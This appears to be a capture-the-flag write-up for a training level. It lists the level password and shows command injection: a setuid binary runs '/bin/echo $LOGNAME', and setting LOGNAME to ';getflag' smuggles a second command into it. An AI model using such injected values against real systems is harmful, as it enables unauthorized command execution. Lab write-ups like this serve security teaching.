# Level 07

## Password
> wiok45aaoguiboiki2tuin6ub

## Steps
1. ```scp -P4242 level07@<ip>:/home/user/level07/level07 .```
2. Decompile binary with [Ghidra](https://dogbolt.org/)
	- We can see that the program executes the command: ```/bin/echo $LOGNAME```
3. Set custom LOGNAME value: ```export LOGNAME=';getflag'```
4. Execute binary: ```~/level07```

## Description
After setting LOGNAME as ```;getflag```, the program's command became ```/bin/echo ;getflag```
